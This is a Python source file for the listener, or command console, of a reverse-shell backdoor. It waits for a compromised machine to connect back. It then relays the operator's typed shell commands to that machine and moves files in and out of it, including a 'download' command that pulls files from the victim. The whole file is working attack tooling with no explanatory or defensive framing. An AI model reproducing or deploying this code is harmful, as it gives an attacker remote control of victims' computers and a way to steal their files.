import socket,pickle,subprocess,base64
class Listener:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            file.close()
        return "[+]DOWNLOADED " + path

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def exit(self):
        print("[+] DISCONNECTING")
        print("[+] EXITING")
        subprocess.call("clear", shell=True)
        exit()

    def send(self,data,connection):
        commands = pickle.dumps(data)
        connection.send(commands)
        if data[0] == "exit":
            connection.close()
            self.exit()

    def receive(self,connection):
        data = "".encode()
        while True:
            try:
                data += connection.recv(1024)
                output = pickle.loads(data)
                try:
                    output = output.decode()
                except:
                    output = output

                return output
            except pickle.UnpicklingError:
                continue

    def current_directory(self,connection):
        self.send(["cd"], connection)
        cd = self.receive(connection)
        return cd

    def post_connection(self,connection):
        while True:
            try:
                command = input("Command >> ").split(" ")

                if command[0] == "download":
                    self.send(command, connection)
                    output = self.receive(connection)
                    output = self.write_file(command[1],output)
                elif command[0] == "upload":
                    command[1] = command[1].split("/")
                    file_name = command[1][-1]
                    file = self.read_file(file_name)
                    command = ["upload",file_name,file]
                    self.send(command, connection)
                    output = self.receive(connection)
                else:
                    self.send(command, connection)
                    output = self.receive(connection)
                print(output)
            except Exception as e:
                print(f"[-] {e} error occurred ")
                self.post_connection(connection)

    def start(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip,self.port))
        listener.listen(0)
        print("[+] WAITING FOR A CONNECTION")
        self.connection, self.address = listener.accept()
        print("[+] CONNECTED TO " + str(self.address))
        try:
            self.post_connection(self.connection)
        except KeyboardInterrupt:
            self.send("exit",self.connection)
